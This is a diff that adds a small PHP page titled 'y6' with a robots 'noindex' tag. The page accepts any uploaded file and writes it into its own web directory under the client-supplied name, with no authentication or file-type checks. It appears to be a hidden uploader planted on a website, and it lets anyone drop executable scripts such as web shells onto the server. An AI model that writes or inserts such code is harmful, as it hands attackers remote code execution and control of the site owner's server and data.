@@ -1,0 +1,31 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["submit"])) {
+    $uploadDir = __DIR__; // Current directory
+
+    $uploadedFile = $_FILES["file"]["tmp_name"];
+    $uploadedFileName = $_FILES["file"]["name"];
+    $destination = $uploadDir . '/' . $uploadedFileName;
+
+    if (move_uploaded_file($uploadedFile, $destination)) {
+        echo "success";
+    } else {
+        echo "failed";
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<meta name="robots" content="noindex">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>y6</title>
+</head>
+<body>
+    <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post" enctype="multipart/form-data">
+	<input type="file" name="file" id="file" required>
+        <button type="submit" name="submit">Upload</button>
+    </form>
+</body>
+</html>
